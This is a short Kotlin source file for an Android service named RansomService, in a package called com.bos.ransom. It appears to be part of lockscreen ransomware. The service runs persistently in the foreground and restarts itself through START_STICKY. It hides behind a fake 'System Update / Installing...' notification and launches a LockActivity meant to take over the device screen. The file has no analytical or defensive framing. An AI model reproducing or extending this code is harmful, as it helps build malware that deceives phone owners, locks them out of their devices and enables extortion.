package com.bos.ransom

import android.app.*
import android.content.Intent
import android.os.Build
import android.os.IBinder

class RansomService : Service() {
    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForeground(1, buildNotif())
        
        val lock = Intent(this, LockActivity::class.java)
        lock.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
        startActivity(lock)
        
        return START_STICKY
    }

    private fun buildNotif(): Notification {
        val ch = "sys"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val c = NotificationChannel(ch, "System", NotificationManager.IMPORTANCE_LOW)
            getSystemService(NotificationManager::class.java).createNotificationChannel(c)
        }
        return Notification.Builder(this, ch)
            .setContentTitle("System Update")
            .setContentText("Installing...")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .build()
    }
}
